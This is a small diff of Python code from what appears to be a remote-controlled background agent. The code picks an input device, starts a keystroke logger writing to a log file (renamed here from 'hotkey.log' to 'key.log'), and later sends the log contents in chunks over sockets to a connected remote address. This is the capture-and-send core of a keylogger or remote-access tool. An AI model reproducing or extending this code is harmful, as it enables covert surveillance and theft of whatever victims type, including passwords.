@@ -1139,7 +1139,7 @@ def run_bg(ctx: Context):
                 # Set the module-level logger_device
                 hotkeys.logger_device = devices[choice]
                 print(f"[BG] Selected: {devices[choice].path} - {devices[choice].name}")
-                start_logger("hotkey.log")
+                start_logger("key.log")
                 print("[BG] Logger started successfully")
             else:
                 print(f"[BG] Invalid choice {choice}")
@@ -1176,7 +1176,7 @@ def stop_bg(ctx: Context):
     try:
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
-        log_content = get_hotkey_log_content("hotkey.log")
+        log_content = get_hotkey_log_content("key.log")
         print(f"[BG] Sending log ({len(log_content)} bytes)...")
 
         if send_byte_stream_chunked(send_socket, recv_socket, source_ip,
